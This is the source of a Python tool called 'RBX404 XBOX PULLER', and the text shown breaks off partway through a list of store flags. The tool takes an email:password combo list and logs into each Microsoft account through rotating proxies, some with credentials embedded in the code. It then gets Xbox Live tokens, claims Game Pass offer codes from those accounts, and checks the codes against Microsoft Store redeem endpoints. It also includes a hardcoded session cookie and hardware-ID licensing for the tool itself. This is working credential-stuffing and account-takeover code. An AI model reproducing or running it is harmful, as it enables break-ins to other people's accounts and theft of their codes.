#!/usr/bin/env python3
"""
RBX404 XBOX PULLER - Elite Edition
Android Compatible | Rich UI | Built-in Proxies
No Tkinter | Pure Terminal
"""

import requests
import re
import json
import time
import random
import string
import os
import sys
import queue
import threading
import uuid
import hashlib
import platform
import subprocess
from datetime import datetime
from typing import Optional, Tuple, List, Dict
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

sys.dont_write_bytecode = True

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, MofNCompleteColumn
    from rich.prompt import Prompt, IntPrompt, Confirm
    from rich.text import Text
    from rich.layout import Layout
    from rich.live import Live
    from rich.align import Align
    from rich import box
    from rich.columns import Columns
    from rich.rule import Rule
    from rich.markup import escape
except ImportError:
    print("Installing rich library...")
    os.system(f"{sys.executable} -m pip install rich")
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, MofNCompleteColumn
    from rich.prompt import Prompt, IntPrompt, Confirm
    from rich.text import Text
    from rich.layout import Layout
    from rich.live import Live
    from rich.align import Align
    from rich import box
    from rich.columns import Columns
    from rich.rule import Rule
    from rich.markup import escape

try:
    import requests
except ImportError:
    os.system(f"{sys.executable} -m pip install requests")
    import requests

console = Console()

# ============================================================================
# GLOBALS
# ============================================================================

print_lock = Lock()
results_lock = Lock()

CONFIG_FILE = "RBX404_config.json"

VERSION = "2.0"
AUTHOR = "RBX404"

# Stats tracking
class Stats:
    def __init__(self):
        self.lock = Lock()
        self.fetched = 0
        self.valid = 0
        self.valid_card = 0
        self.invalid = 0
        self.redeemed = 0
        self.expired = 0
        self.region_locked = 0
        self.unknown = 0
        self.errors = 0
        self.rate_limited = 0
        self.checked = 0
        self.total = 0
        self.balance_codes = 0

    def increment(self, key):
        with self.lock:
            setattr(self, key, getattr(self, key) + 1)

stats = Stats()

# ============================================================================
# BUILT-IN PROXIES
# ============================================================================

BUILTIN_PROXIES = [
    "895803e88e09d774.fjt.na.novada.pro:7777:novada194rkD_76nJGA-zone-res:lXm7rbh22AjU",
    "87.248.148.1:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382",
    "87.248.148.166:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382",
    "31.193.191.114:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382",
    "31.193.191.115:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382",
    "31.193.191.116:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382",
    "193.36.187.169:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382",
    "193.36.187.170:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382",
    "193.36.187.171:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382",
    "87.248.148.2:3128:sub_crypto_1t4by0jb4g9i6pkhqvtmzyhv:stat382",
]

# ============================================================================
# LICENSE CONFIG
# ============================================================================

LICENSE_URL = "https://raw.githubusercontent.com/plutobearz/liscenses/refs/heads/main/licenses.json"

PLAN_LIMITS = {
    "FREE": {"max_accounts": 0, "max_threads": 0, "max_codes": 0},
    "BASIC": {"max_accounts": 0, "max_threads": 0, "max_codes": 0},
    "PRO": {"max_accounts": 0, "max_threads": 0, "max_codes": 0},
    "PREMIUM": {"max_accounts": 0, "max_threads": 0, "max_codes": 0},
    "Cracked": {"max_accounts": 0, "max_threads": 0, "max_codes": 0},
}

# ============================================================================
# CONFIG
# ============================================================================

def load_config():
    default_config = {
        "fetch_threads": 10,
        "validate_threads": 10,
        "max_threads": 20,
        "use_builtin_proxies": True,
        "proxy_file": "proxies.txt"
    }
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                config = json.load(f)
                for key, value in default_config.items():
                    if key not in config:
                        config[key] = value
                return config
        except Exception:
            pass
    return default_config

def save_config(config):
    try:
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=2)
        return True
    except Exception:
        return False

CONFIG = load_config()

# ============================================================================
# UI HELPERS
# ============================================================================

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear()
    banner_text = """
[bold red]   ███████╗██╗   ██╗██╗  ██╗██╗   ██╗███╗   ██╗ █████╗ [/]
[bold red]   ██╔════╝██║   ██║██║ ██╔╝██║   ██║████╗  ██║██╔══██╗[/]
[bold red]   ███████╗██║   ██║█████╔╝ ██║   ██║██╔██╗ ██║███████║[/]
[bold red]   ╚════██║██║   ██║██╔═██╗ ██║   ██║██║╚██╗██║██╔══██║[/]
[bold red]   ███████║╚██████╔╝██║  ██╗╚██████╔╝██║ ╚████║██║  ██║[/]
[bold red]   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝[/]
[bold magenta]            �� XBOX PULLER ⚡ v{ver} [/]
[dim white]         Elite Code Fetcher & Validator[/]
[dim white]            Android Compatible[/]
""".format(ver=VERSION)
    console.print(Panel(
        Align.center(banner_text),
        border_style="red",
        box=box.DOUBLE_EDGE,
        title="[bold white]👹 RBX404[/]",
        subtitle=f"[dim]by {AUTHOR}[/]"
    ))

def show_stats_table():
    table = Table(box=box.ROUNDED, border_style="red", title="[bold red]📊 Live Stats[/]")
    table.add_column("Category", style="bold white", justify="center")
    table.add_column("Count", style="bold cyan", justify="center")
    table.add_row("✅ Valid", str(stats.valid))
    table.add_row("💰 Balance Codes", str(stats.balance_codes))
    table.add_row("💳 Valid (Card)", str(stats.valid_card))
    table.add_row("❌ Invalid", str(stats.invalid))
    table.add_row("🔄 Redeemed", str(stats.redeemed))
    table.add_row("⏰ Expired", str(stats.expired))
    table.add_row("🌍 Region Locked", str(stats.region_locked))
    table.add_row("❓ Unknown", str(stats.unknown))
    table.add_row("⚠️ Rate Limited", str(stats.rate_limited))
    table.add_row("💀 Errors", str(stats.errors))
    table.add_row("─" * 15, "─" * 8)
    table.add_row("[bold]📝 Checked[/]", f"[bold]{stats.checked}/{stats.total}[/]")
    return table

# ============================================================================
# HWID & LICENSE
# ============================================================================

def get_hwid():
    hwid_data = ""
    try:
        if platform.system() == "Windows":
            try:
                output = subprocess.check_output('wmic csproduct get uuid', shell=True, stderr=subprocess.DEVNULL)
                hwid_data += output.decode().split('\n')[1].strip()
            except:
                pass
            try:
                output = subprocess.check_output('wmic bios get serialnumber', shell=True, stderr=subprocess.DEVNULL)
                hwid_data += output.decode().split('\n')[1].strip()
            except:
                pass
        elif platform.system() == "Linux":
            try:
                with open('/etc/machine-id', 'r') as f:
                    hwid_data += f.read().strip()
            except:
                pass
            try:
                output = subprocess.check_output('cat /sys/class/dmi/id/product_uuid', shell=True, stderr=subprocess.DEVNULL)
                hwid_data += output.decode().strip()
            except:
                pass
        elif platform.system() == "Darwin":
            try:
                output = subprocess.check_output("ioreg -rd1 -c IOPlatformExpertDevice | grep -E '(IOPlatformUUID)'", shell=True, stderr=subprocess.DEVNULL)
                hwid_data += output.decode().strip()
            except:
                pass
        if not hwid_data:
            import socket
            hwid_data = socket.gethostname() + str(uuid.getnode())
        hwid_data += platform.node() + platform.machine()
    except:
        hwid_data = str(uuid.getnode()) + platform.node()
    return hashlib.sha256(hwid_data.encode()).hexdigest()[:32].upper()

def fetch_licenses(url):
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

def check_license(hwid, data):
    if not data or "licenses" not in data:
        return None
    for entry in data["licenses"]:
        if entry.get("hwid", "").upper() == hwid.upper():
            expiry_str = entry.get("expiry", "")
            if expiry_str:
                try:
                    if datetime.now() > datetime.strptime(expiry_str, "%Y-%m-%d"):
                        return {"status": "EXPIRED", "plan": entry.get("plan", "FREE")}
                except:
                    pass
            return {
                "status": "VALID",
                "plan": entry.get("plan", "FREE"),
                "name": entry.get("name", "User"),
                "expiry": expiry_str
            }
    return None

def show_license_panel(license_info, hwid):
    table = Table(box=box.ROUNDED, border_style="cyan", show_header=False)
    table.add_column("Key", style="bold white")
    table.add_column("Value", style="bold cyan")
    table.add_row("🔑 HWID", hwid)

    if license_info is None:
        table.add_row("📛 Status", "[bold red]❌ NOT LICENSED[/]")
        table.add_row("ℹ️ Info", "[yellow]Contact admin for license[/]")
        console.print(Panel(table, title="[bold red]License Status[/]", border_style="red"))
        return False

    if license_info["status"] == "EXPIRED":
        table.add_row("📛 Status", "[bold red]⏰ EXPIRED[/]")
        table.add_row("📋 Plan", license_info["plan"])
        console.print(Panel(table, title="[bold red]License Status[/]", border_style="red"))
        return False

    plan = license_info["plan"]
    table.add_row("✅ Status", "[bold green]LICENSED[/]")
    table.add_row("👤 Name", f"[green]{license_info.get('name', 'User')}[/]")
    table.add_row("📋 Plan", f"[green]{plan}[/]")
    expiry = license_info.get("expiry")
    table.add_row("📅 Expires", f"[green]{'LIFETIME' if not expiry else expiry}[/]")
    table.add_row("📊 Limits", "[cyan]Unlimited[/]")
    console.print(Panel(table, title="[bold green]License Status[/]", border_style="green"))
    return True

# ============================================================================
# PROXY FUNCTIONS
# ============================================================================

def format_proxy(proxy_string):
    """Convert proxy string to requests proxy dict"""
    proxy_string = proxy_string.strip()
    if not proxy_string or ':' not in proxy_string:
        return None
    try:
        if proxy_string.count("@") >= 1:
            credentials, addr = proxy_string.split("@", 1)
            username, password = credentials.split(":", 1)
            proxy_url = f"http://{username}:{password}@{addr}"
        elif proxy_string.count(':') == 3:
            ip, port, username, password = proxy_string.split(':')
            proxy_url = f"http://{username}:{password}@{ip}:{port}"
        elif proxy_string.count(':') == 1:
            proxy_url = f"http://{proxy_string}"
        else:
            proxy_url = f"http://{proxy_string}"
        return {'http': proxy_url, 'https': proxy_url}
    except:
        return None

def get_random_proxy(proxies_list):
    if not proxies_list:
        return None
    proxy = random.choice(proxies_list)
    return format_proxy(proxy)

def read_proxies_from_file(file_path='proxies.txt'):
    try:
        with open(file_path, 'r', encoding='utf8') as f:
            proxies = [line.strip() for line in f if line.strip() and ':' in line.strip()]
            if proxies:
                console.print(f"[green]✅ Loaded {len(proxies)} proxies from {file_path}[/]")
            return proxies
    except FileNotFoundError:
        console.print(f"[red]❌ Proxy file '{file_path}' not found[/]")
        return []
    except Exception as e:
        console.print(f"[red]❌ Error reading proxy file: {e}[/]")
        return []

def get_active_proxies():
    """Get proxies based on config"""
    all_proxies = list(BUILTIN_PROXIES)

    if os.path.exists(CONFIG.get("proxy_file", "proxies.txt")):
        file_proxies = read_proxies_from_file(CONFIG.get("proxy_file", "proxies.txt"))
        all_proxies.extend(file_proxies)

    if all_proxies:
        console.print(f"[green]🌐 Total proxies available: {len(all_proxies)} (built-in: {len(BUILTIN_PROXIES)}, file: {len(all_proxies) - len(BUILTIN_PROXIES)})[/]")
    else:
        console.print("[yellow]⚠️ No proxies available - using direct connection[/]")

    return all_proxies

# ============================================================================
# ACCOUNT READING
# ============================================================================

def read_accounts(file_path):
    accounts = []
    skipped = 0
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                if ':' not in line:
                    skipped += 1
                    continue
                parts = line.split(':', 1)
                email = parts[0].strip()
                password = parts[1].strip()
                if not email or not password:
                    skipped += 1
                    continue
                if '@' not in email:
                    skipped += 1
                    continue
                accounts.append((email, password))
    except FileNotFoundError:
        console.print(f"[red]❌ File not found: {file_path}[/]")
    except Exception as e:
        console.print(f"[red]❌ Error reading accounts: {e}[/]")

    if skipped > 0:
        console.print(f"[yellow]⚠️ Skipped {skipped} invalid lines[/]")

    return accounts

def select_file(prompt_text="Enter file path"):
    """Simple file selection for Android/terminal"""
    while True:
        # List txt files in current directory
        txt_files = [f for f in os.listdir('.') if f.endswith('.txt')]
        if txt_files:
            console.print(f"\n[cyan]📁 Files in current directory:[/]")
            table = Table(box=box.SIMPLE, border_style="dim")
            table.add_column("#", style="bold yellow", justify="center")
            table.add_column("File", style="white")
            table.add_column("Size", style="dim", justify="right")
            for i, f in enumerate(txt_files, 1):
                size = os.path.getsize(f)
                if size < 1024:
                    size_str = f"{size} B"
                elif size < 1024 * 1024:
                    size_str = f"{size/1024:.1f} KB"
                else:
                    size_str = f"{size/(1024*1024):.1f} MB"
                table.add_row(str(i), f, size_str)
            console.print(table)
            console.print(f"[dim]Enter number to select, or type full path[/]")

        user_input = Prompt.ask(f"[bold yellow]{prompt_text}[/]").strip()

        if user_input.isdigit():
            idx = int(user_input) - 1
            if 0 <= idx < len(txt_files):
                return txt_files[idx]
            else:
                console.print("[red]❌ Invalid number[/]")
                continue

        if os.path.exists(user_input):
            return user_input
        else:
            console.print(f"[red]❌ File not found: {user_input}[/]")

# ============================================================================
# FETCHER FUNCTIONS
# ============================================================================

MICROSOFT_OAUTH_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

def fetch_oauth_tokens(session):
    try:
        response = session.get(MICROSOFT_OAUTH_URL, timeout=15)
        text = response.text
        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        if not match:
            return (None, None)
        ppft = match.group(1)
        match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
        if not match:
            return (None, None)
        return (match.group(1), ppft)
    except:
        return (None, None)

def fetch_login(session, email, password, url_post, ppft):
    try:
        resp = session.post(url_post,
            data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft},
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=True, timeout=15)
        if '#' in resp.url:
            token = parse_qs(urlparse(resp.url).fragment).get('access_token', ['None'])[0]
            if token != 'None':
                return token
        if 'cancel?mkt=' in resp.text:
            ipt = re.search(r'(?<="ipt" value=").+?(?=">)', resp.text)
            pprid = re.search(r'(?<="pprid" value=").+?(?=">)', resp.text)
            uaid = re.search(r'(?<="uaid" value=").+?(?=">)', resp.text)
            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', resp.text)
            if ipt and pprid and uaid and action:
                ret = session.post(action.group(),
                    data={'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()},
                    allow_redirects=True, timeout=15)
                return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":")+.+?(?=",)', ret.text)
                if return_url:
                    fin = session.get(return_url.group(), allow_redirects=True, timeout=15)
                    if '#' in fin.url:
                        token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                        if token != 'None':
                            return token
        return None
    except:
        return None

def get_xbox_tokens(session, rps_token):
    try:
        resp = session.post('https://user.auth.xboxlive.com/user/authenticate',
            json={'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT',
                  'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': rps_token}},
            headers={'Content-Type': 'application/json'}, timeout=15)
        if resp.status_code != 200:
            return (None, None)
        user_token = resp.json().get('Token')
        resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
            json={'RelyingParty': 'http://xboxlive.com', 'TokenType': 'JWT',
                  'Properties': {'UserTokens': [user_token], 'SandboxId': 'RETAIL'}},
            headers={'Content-Type': 'application/json'}, timeout=15)
        if resp.status_code != 200:
            return (None, None)
        data = resp.json()
        return (data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs'), data.get('Token'))
    except:
        return (None, None)

def fetch_codes_from_xbox(session, uhs, xsts_token):
    try:
        auth = f'XBL3.0 x={uhs};{xsts_token}'
        resp = session.get('https://profile.gamepass.com/v2/offers',
            headers={'Authorization': auth, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'}, timeout=15)
        if resp.status_code != 200:
            return []
        codes = []
        for offer in resp.json().get('offers', []):
            resource = offer.get('resource')
            if resource:
                codes.append(resource)
            elif offer.get('offerStatus') == 'available':
                cv = ''.join(random.choices(string.ascii_letters + string.digits, k=22)) + '.0'
                claim_resp = session.post(f'https://profile.gamepass.com/v2/offers/{offer.get("offerId")}',
                    headers={'Authorization': auth, 'content-type': 'application/json', 'User-Agent': 'okhttp/4.12.0', 'ms-cv': cv, 'Content-Length': '0'},
                    data='', timeout=15)
                if claim_resp.status_code == 200:
                    code = claim_resp.json().get('resource')
                    if code:
                        codes.append(code)
        return codes
    except:
        return []

def fetch_account_worker(email, password, idx, total, proxies_list):
    session = requests.Session()
    proxy = get_random_proxy(proxies_list)
    if proxy:
        session.proxies = proxy
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

    try:
        url_post, ppft = fetch_oauth_tokens(session)
        if not url_post:
            console.print(f"[red]  [{idx}/{total}] ❌ {email[:25]}... Auth failed[/]")
            return []

        rps = fetch_login(session, email, password, url_post, ppft)
        if not rps:
            console.print(f"[red]  [{idx}/{total}] ❌ {email[:25]}... Login failed[/]")
            return []

        uhs, xsts = get_xbox_tokens(session, rps)
        if not uhs:
            console.print(f"[red]  [{idx}/{total}] ❌ {email[:25]}... Xbox tokens failed[/]")
            return []

        codes = fetch_codes_from_xbox(session, uhs, xsts)
        if codes:
            stats.fetched += len(codes)
            console.print(f"[green]  [{idx}/{total}] ✅ {email[:25]}... → {len(codes)} codes[/]")
        else:
            console.print(f"[yellow]  [{idx}/{total}] ⚠️ {email[:25]}... No codes[/]")
        return codes
    except Exception:
        console.print(f"[red]  [{idx}/{total}] ❌ {email[:25]}... Error[/]")
        return []
    finally:
        session.close()

# ============================================================================
# VALIDATOR FUNCTIONS
# ============================================================================

def generate_reference_id():
    timestamp_val = int(time.time() // 30)
    n = f'{timestamp_val:08X}'
    o = (uuid.uuid4().hex + uuid.uuid4().hex).upper()
    result_chars = []
    for e in range(64):
        if e % 8 == 1:
            result_chars.append(n[(e - 1) // 8])
        else:
            result_chars.append(o[e])
    return "".join(result_chars)

def login_microsoft_account(email, password, proxies=None):
    session = requests.Session()
    if proxies:
        session.proxies = proxies

    session.headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://account.microsoft.com/',
        'Origin': 'https://account.microsoft.com',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
    }

    try:
        login_response = session.post(
            f"https://login.live.com/ppsecure/post.srf?username={email}&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=833A37B454306173&opid=81A1AC2B0BEB4ABA&bk=1761964181&uaid=f8aac2614ca54994b0bb9621af361fe6&pid=15216&prompt=none",
            data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': "-DmNqKIwViyNLVW!ndu48B52hWo3*dmmh3IYETDXnVvQdWK!9sxjI48z4IX*vHf5Gl*FYol2kesrvhsuunUYDLekZOg8UW8V4cugeNYzI1wLpI7wHWnu9CLiqRiISqQ2jS1kLHkeekbWTFtKb2l0J7k3nmQ3u811SxsV1e4l8WfyX8Pt8!pgnQ1bNLoptSPmVE45tyzHdttjDZeiMvu6aV0NrFLHYroFsVS581ZI*C8z27!K5I8nESfTU!YxntGN1RQ$$"},
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                "Cookie": "MSPRequ=id=N&lt=1761964181&co=1; uaid=f8aac2614ca54994b0bb9621af361fe6; MSCC=110.226.176.161-IN; MSPOK=$uuid-28da118b-591b-4245-a835-d6a7a6516fc6; OParams=11O.DtU8h4PuH7vnv3smo7N1*styCuvoTV2MRZi8wj4oQDgi!Mpw6KZwEGt9RgLvxFZ*vwFA!0!1OLGPdeGOwX9EAmOhMaLVWgPa3!lut3b6iSqLZwZ6wKNo48s9Glp9oJNYOJ!QdDvn9Zlz6yUfmGNA71N*7RJJ82DhAEUtv9cj3S5VSLPp*rLjsZw*T!eA4rT1OoHQfj!E0MpIMb7XTGunq0W296qtBwcXcMiKnoG1DOOam7ArRr9kSeVqb2OO3gQ8tBcGfef*aveFCKUAbkdjWuhRB4vYl2RmUA5yc967445z!g761lZOAEaXxAMTGxbEibxTneHDX4PpnqWIwURKn*igMH7p7LRvIUh0TPAO2ff6h793xvhtYi3SYKj4gT6KaajxfJ3fL0Ceb*308Ner9hi32b2GVnW81LmKcQLF343cM0KcKgRXBqkPdIJ3fS*4l8wFshd1kpI0elXVUgQ9A5a4tPKO46vh9k*luyC!RSNjzNs4oQKLFF1TXRB1LifVMLwKQ3aJTxxys!YvalzEB5q6TG*bKZ1FDBjFfpSIEVdfg8XMOBszi3TGeXJw*sg5zsSVv9Efpe3UfEvAgAr24Qk*fYd2G0FdzrNpxb9nntPSX*TYsh2k5EYuW9RD6qo!qtSh8EXzTq0WS6qII0*Tkn*NxydUx3WPbZ2fiOU*ulkS8TlhUKRRbNNTMeYIWl93GOeP9cIuXtFuZ3XZimHUgv86pjFVxKXeDCVQpyOjVUSL67AuADB0ukQBYlw7z48cv0Q5XlXX4umkZErVDo5f9W4uE1mTaav!WpKqighrUL2Me5Uqexr*RCtwpDu1f5W1ay0xmPoxx*W5lIIQUmKYua93KiFQsxnma3iHtSaH2tUeClZaWauWKkBt5xwyZ3ajhyWT4Ylw8lfDgf0RNWQhdrQ6EVtXowflqyiWC71dfjUDqVnSCzTcUuZCX*Hzkewo5G3LZczEm1MeuQRPMFisXNkf3KSBgzwqlyt8rHQrNYzuZRMTyO9WGt1RS1kTDs1XNu3PG8qA1HWTq7kwHvKeVblEr!!YGoUFWaWWsQqLa0Co7x83jzWgGDTOa3NFawXQGsA5snh7HsS01WqUHgCtHT9RKRegHay9aO813K5jayLc3UR9qO2mspBZhSKuaYPOoaNUeoF5ImgWitT*g1ogFFJl12AgfmtEVWDVhzmvtR1j7oNlvEE2g0fu0SMo!NTV3zbWjxfN!F1b6UxCV0uFT7QTf8yL2M4Lw8CnCTWa5N*jc2SSZe4O2SU*2HPHn0lYFOUkGGoXTe2pHGQiW0hA8jFnufIOzjTZ0VLEA7Z6QlW62lkpDEW9OXmUdqRmp225Ag$$"
            },
            allow_redirects=True,
            timeout=30
        )
        login_request = login_response.text.replace('\\', '')
        reurl_match = re.search(r'replace\(\"([^\"]+)\"', login_request)
        if not reurl_match:
            return None
        reurl = reurl_match.group(1)
        try:
            reresp = session.get(reurl, timeout=30).text
        except:
            return None
        actch = re.search(r'<form.*?action="(.*?)".*?>', reresp)
        if not actch:
            return None
        acu = actch.group(1)
        input_matches = re.findall(r'<input.*?name="(.*?)".*?value="(.*?)".*?>', reresp)
        fta = {name: value for name, value in input_matches}
        try:
            final_response = session.post(acu, data=fta, allow_redirects=True, timeout=30)
            if final_response.status_code != 200:
                return None
        except:
            return None
        return session
    except:
        return None

def get_auth_token(session, force_refresh=False):
    try:
        if not force_refresh and hasattr(session, 'wlid_token'):
            return session.wlid_token
        session.get("https://buynowui.production.store-web.dynamics.com/akam/13/79883e11", timeout=10)
        token_headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Referer': 'https://account.microsoft.com/billing/redeem'
        }
        token_response = session.get(
            'https://account.microsoft.com/auth/acquire-onbehalf-of-token',
            params={'scopes': 'MSComServiceMBISSL'},
            headers=token_headers,
            timeout=15
        )
        if token_response.status_code != 200:
            return None
        token_data = token_response.json()
        if not token_data or len(token_data) == 0:
            return None
        token = token_data[0]['token']
        session.wlid_token = token
        return token
    except:
        return None

def get_store_cart_state(session, force_refresh=False):
    try:
        if force_refresh and hasattr(session, 'store_state'):
            delattr(session, 'store_state')
        if not force_refresh and hasattr(session, 'store_state'):
            return session.store_state
        token = get_auth_token(session, force_refresh)
        if not token:
            return None
        ms_cv = "xddT7qMNbECeJpTq.6.2"
        url = 'https://www.microsoft.com/store/purchase/buynowui/redeemnow'
        params = {'ms-cv': ms_cv, 'market': 'US', 'locale': 'en-GB', 'clientName': 'AccountMicrosoftCom'}
        payload = {'data': '{"usePurchaseSdk":true}', 'market': 'US', 'cV': ms_cv, 'locale': 'en-GB', 'msaTicket': token, 'pageFormat': 'full', 'urlRef': 'https://account.microsoft.com/billing/redeem', 'isRedeem': 'true', 'clientType': 'AccountMicrosoftCom', 'layout': 'Inline', 'cssOverride': 'AMC', 'scenario': 'redeem', 'timeToInvokeIframe': '4977', 'sdkVersion': 'VERSION_PLACEHOLDER'}
        try:
            response = session.post(url, params=params, data=payload, timeout=30, allow_redirects=True)
        except:
            return None
        text = response.text
        match = re.search(r'window\.__STORE_CART_STATE__=({.*?});', text, re.DOTALL)
        if not match:
            return None
        try:
            store_state = json.loads(match.group(1))
            extracted = {
                'ms_cv': store_state.get('appContext', {}).get('cv', ''),
                'correlation_id': store_state.get('appContext', {}).get('correlationId', ''),
                'tracking_id': store_state.get('appContext', {}).get('trackingId', ''),
                'vector_id': store_state.get('appContext', {}).get('vectorId', ''),
                'muid': store_state.get('appContext', {}).get('muid', ''),
                'alternative_muid': store_state.get('appContext', {}).get('alternativeMuid', '')
            }
            session.store_state = extracted
            return extracted
        except:
            return None
    except:
        return None

def prepare_redeem_api_call(session, code, headers, payload):
    try:
        response = session.post(
            'https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken',
            headers=headers,
            json=payload,
            timeout=30
        )
        return response
    except:
        return None

def validate_code_primary(session, code, force_refresh_ids=False, prepare_redeem_executor=None):
    try:
        if not code or len(code) < 5 or ' ' in code:
            return {"status": "INVALID", "message": "Invalid code format"}

        store_state = get_store_cart_state(session, force_refresh=force_refresh_ids)
        if not store_state:
            store_state = get_store_cart_state(session, force_refresh=True)
            if not store_state:
                return {"status": "ERROR", "message": "Failed to get store cart state"}

        token = get_auth_token(session, force_refresh=force_refresh_ids)
        if not token:
            token = get_auth_token(session, force_refresh=True)
            if not token:
                return {"status": "ERROR", "message": "Failed to get auth token"}

        try:
            headers = {
                "host": "buynow.production.store-web.dynamics.com",
                "connection": "keep-alive",
                "x-ms-tracking-id": store_state['tracking_id'],
                "sec-ch-ua-platform": "\"Windows\"",
                "authorization": f"WLID1.0=t={token}",
                "x-ms-client-type": "AccountMicrosoftCom",
                "x-ms-market": "US",
                "ms-cv": store_state['ms_cv'],
                "sec-ch-ua-mobile": "?0",
                "x-ms-reference-id": generate_reference_id(),
                "x-ms-vector-id": store_state['vector_id'],
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0",
                "x-ms-correlation-id": store_state['correlation_id'],
                "content-type": "application/json",
                "x-authorization-muid": store_state['alternative_muid'],
                "accept": "*/*",
                "origin": "https://www.microsoft.com",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.microsoft.com/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9"
            }
            payload = {
                "market": "US",
                "language": "en-US",
                "flights": ["sc_abandonedretry","sc_addasyncpitelemetry","sc_adddatapropertyiap","sc_addgifteeduringordercreation","sc_aemparamforimage","sc_aemrdslocale","sc_allowalipayforcheckout","sc_allowbuynowrupay","sc_allowcustompifiltering","sc_allowelo","sc_allowfincastlerewardsforsubs","sc_allowmpesapi","sc_allowparallelorderload","sc_allowpaypay","sc_allowpaypayforcheckout","sc_allowpaysafecard","sc_allowpaysafeforus","sc_allowrupay","sc_allowrupayforcheckout","sc_allowsmdmarkettobeprimarypi","sc_allowupi","sc_allowupiforbuynow","sc_allowupiforcheckout","sc_allowupiqr","sc_allowupiqrforbuynow","sc_allowupiqrforcheckout","sc_allowvenmo","sc_allowvenmoforbuynow","sc_allowvenmoforcheckout","sc_allowverve","sc_analyticsforbuynow","sc_announcementtsenabled","sc_apperrorboundarytsenabled","sc_askaparentinsufficientbalance","sc_askaparentssr","sc_askaparenttsenabled","sc_asyncpiurlupdate","sc_asyncpurchasefailure","sc_asyncpurchasefailurexboxcom","sc_authactionts","sc_autorenewalconsentnarratorfix","sc_bankchallenge","sc_bankchallengecheckout","sc_blockcsvpurchasefrombuynow","sc_blocklegacyupgrade","sc_buynowfocustrapkeydown","sc_buynowglobalpiadd","sc_buynowlistpichanges","sc_buynowprodigilegalstrings","sc_buynowuipreload","sc_buynowuiprod","sc_cartcofincastle","sc_cartrailexperimentv2","sc_cawarrantytermsv2","sc_checkoutglobalpiadd","sc_checkoutitemfontweight","sc_checkoutredeem","sc_clientdebuginfo","sc_clienttelemetryforceenabled","sc_clienttorequestorid","sc_contactpreferenceactionts","sc_contactpreferenceupdate","sc_contactpreferenceupdatexboxcom","sc_conversionblockederror","sc_copycurrentcart","sc_cpdeclinedv2","sc_culturemarketinfo","sc_cvvforredeem","sc_dapsd2challenge","sc_delayretry","sc_deliverycostactionts","sc_devicerepairpifilter","sc_digitallicenseterms","sc_disableupgradetrycheckout","sc_discountfixforfreetrial","sc_documentrefenabled","sc_eligibilityapi",